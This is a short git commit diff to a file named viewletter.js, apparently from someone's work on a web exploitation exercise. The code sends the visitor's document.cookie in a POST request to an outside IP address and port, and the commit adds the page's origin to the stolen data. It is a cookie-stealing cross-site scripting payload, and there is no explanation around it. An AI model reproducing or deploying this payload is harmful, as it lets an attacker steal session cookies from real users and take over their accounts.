9d5e5c47a69a086a9745712b33c3aa72e3e28117
0x00tom <8040940+0x00tom@users.noreply.github.com>
2024-02-04 14:02:40 +0100

    Update viewletter.js

--- viewletter.js
+++ viewletter.js
@@ -2,7 +2,7 @@ console.log("a");
 fetch('http://94.237.63.93:57831/submit', {
     method: 'POST',
     body: JSON.stringify({
-        message: document.cookie,
+        message: window.origin + " stuff "+document.cookie,
     }),
     headers: {
         'Content-Type': 'application/json',
